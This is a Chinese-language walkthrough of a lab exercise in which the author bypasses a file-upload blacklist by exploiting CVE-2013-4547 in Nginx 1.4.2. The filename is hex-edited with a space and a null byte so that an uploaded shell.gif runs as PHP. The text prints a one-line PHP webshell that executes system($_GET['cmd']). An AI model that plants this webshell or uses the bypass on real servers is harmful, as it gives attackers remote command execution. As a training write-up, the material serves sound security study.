# 靶场之文件上传漏洞—16进制绕过

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MjM5Nzk3MjMzMA==&mid=2650569169&idx=1&sn=37fce9448e259c6684ff03ae9211da5a&chksm=bed909d489ae80c29a17e9238a4a898197f04aa03d2b096e1620c54de74abca5bb1b3288c093&scene=126&sessionid=1681665208#rd](http://mp.weixin.qq.com/s?__biz=MjM5Nzk3MjMzMA==&mid=2650569169&idx=1&sn=37fce9448e259c6684ff03ae9211da5a&chksm=bed909d489ae80c29a17e9238a4a898197f04aa03d2b096e1620c54de74abca5bb1b3288c093&scene=126&sessionid=1681665208#rd)

一.背景  

     这两天在看2群的师傅们都很嗨皮，就去网上找了个有点小意思的靶场给到大家玩，结果到目前为止没有一个人是独立完成的。所以特意拿来说下，有点水，但是通过这个，可以看到一点令人深思的地方。

一.过程

   靶场界面如下：

![](../Images/8edb45e878539b89a556a5e5e2e287c7.png)

     这里我讲下我的思路，也是正常渗透测试应该遵循的一点。首选分析是一个，不管他是啥 我们第一步应该是收集信息，（群里很多师傅，先上来就直接绕过，但是发现大部分普通方式的绕过是没什么效果的。耗费不少时间而且容易掉入怪圈。）其实只要按照渗透测试的一般流程走下来，你会发现这个靶场及其简单

    收集信息：  

          先试端口扫描 这里并没有发现可利用的端口，然后是目录扫描同样没有东西，最后通过指纹扫描，通过插件得到用的是Nginx 1.4.2版本

![](../Images/f296323751223ef4815863106a6b7857.png)

       这个版本其实网上很早就已经爆出了一个漏洞编号是cve-2013-4547 一个文件解析漏洞，群里很多师傅并没有去尝试这个，直接上去绕了发现绕来绕去都绕不过去。我也说了如果我说了漏洞点估计有人会喷死我的原因也在这里给师傅们挖了个坑，大家一起往里面跳了  这个漏洞具体啥回事百度有这里不多做解释。我带大家复现一波

    首先制作webshell   

*   
*   
*   
*   

```
<?phpphpinfo();system($_GET['cmd']);?>
```

        直接上传php试下  发现不行

![](../Images/2925bfdaf1e8d9670f9e80488339b4d6.png)

重新改名字 用shell.gif 发现图片可以上传 说明有黑名单。  

![](../Images/2462bbda72a7f24a4862a8e17b825942.png)

接下来结合cve-2013-4547 文件解析 进行16禁止绕过 用shell.gif .php

![](../Images/80e66268560c3bdc4ef7e9f8734dd32f.png)

  

     在gif后面的空格处填入20 后面添加一个00 （为什么这样百度有解释，因为是很老的了所以我就不复制粘贴了）图片中可以看到20代表着空格  

![](../Images/e83a3ce796a4469fa46d2a661f0ef719.png)

在20后面添加一个00的操作

  

![](../Images/82f7aba5ec0376a93e6cb155799ba8e2.png)

![](../Images/590e066fa42ab41c720eb7eb50764ed9.png)

然后进行发包，图片可以看到发包了

![](../Images/8f3e7b57b7240f9a49499cc28a89afc2.png)

接下来我们访问下这个 发现gif成功被解析成了php  

![](../Images/07bc75a702bd68b9bdbc1e05cd155fa7.png)

      网上有比我更专业的讲解，我这里就不多做描述了。只是看着群里师傅们在我靶场上面上传了一堆文件，可最终没有成功的，表示很遗憾。下图就是证据，有个小插曲，不知道哪个师傅一直在fuzz上传，这就让我很尴尬了。![](../Images/8de562dd1a4e656d267955391b63ce9e.png)  注意到shell.gif了吗？![](../Images/8dc381c93d31d80aacf035fa50010608.png)

![](../Images/ad1f77a8226446188f288b2e06dbfc5a.png)

     应该是忽略了这个点。至于为什么忽略，我想是因为通常现在的web应用在处理上传文件时，都会将文件重命名，通过应用本身强行加后缀，或者对后缀名去掉特殊字符后，做类型判断。所以会被大家所忽视这个点。所以现实中想遇到此类环境的话几乎是不太可能了。完全是图一乐罢了。
